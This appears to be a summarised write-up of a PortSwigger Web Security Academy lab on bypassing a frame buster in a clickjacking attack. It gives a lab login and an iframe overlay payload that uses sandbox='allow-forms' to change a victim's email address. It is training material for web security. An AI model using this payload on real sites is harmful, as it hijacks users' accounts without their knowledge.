## Clickjacking with a frame buster script

**Category:** clickjacking
**Difficulty:** Unknown

### Description
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `wiener:peter`
- `<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
- `YOUR-LAB-ID`
- `$opacity`
- `sandbox="allow-forms"`

### Indicators of Success
- Target page frameable (no X-Frame-Options)
- Victim clicks hidden element
- Action performed via UI redressing
- Frame buster bypassed
- CSP frame-ancestors missing
---
*Source: PortSwigger Web Security Academy*
